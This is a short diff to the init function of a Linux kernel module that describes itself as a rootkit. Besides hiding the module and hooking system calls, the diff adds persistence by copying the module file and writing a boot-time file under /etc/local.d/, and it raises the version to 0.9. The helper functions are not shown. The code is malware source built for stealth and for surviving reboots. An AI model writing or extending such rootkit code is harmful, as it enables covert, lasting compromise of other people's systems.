@@ -15,7 +15,7 @@ MODULE_AUTHOR("[AUTHOR 2]");
 MODULE_AUTHOR("[AUTHOR 3]");
 MODULE_AUTHOR("[AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
-MODULE_VERSION("0.1");
+MODULE_VERSION("0.9");
 
 static int __init rootkit_init(void)
 {
@@ -36,6 +36,17 @@ static int __init rootkit_init(void)
     hide_module();
 
     hook_syscalls(P_SYSCALL_HOOKS);
+
+    i32_err = copy_module_file();
+    IF_U (i32_err != 0) {
+        pr_dev_err("Failed to copy module file\n");
+    }
+    else {
+        i32_err = create_locald_file();
+        IF_U (i32_err != 0) {
+            pr_dev_err("Failed to create /etc/local.d/ file\n");
+        }
+    }
 
     pr_dev_info("Module loaded\n");
     return 0;
